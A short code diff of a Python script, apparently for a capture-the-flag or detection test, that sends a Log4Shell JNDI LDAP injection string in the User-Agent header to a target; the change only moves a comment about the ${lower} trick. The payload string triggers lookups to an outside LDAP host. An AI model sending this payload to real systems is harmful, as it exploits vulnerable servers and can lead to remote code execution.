@@ -12,11 +12,13 @@ parser.add_argument('--target', nargs='?', default="http://rsxc.no:20024", type=
 
 args = parser.parse_args()
 
+# Using ${lower} to prevent false positives
+# (e.g. by DNS lookups not caused by Log4Shell)
 user_agent = "${jndi:ldap://x${lower:AAAA}x.%s}" % args.ldap_url 
 
 headers = {
     "Connection": "close",
-    "User-Agent": user_agent # Using ${lower} to prevent false positives (e.g. by DNS lookups not caused by Log4Shell)
+    "User-Agent": user_agent
 }
 
 print(f"User-Agent set to: {user_agent}")
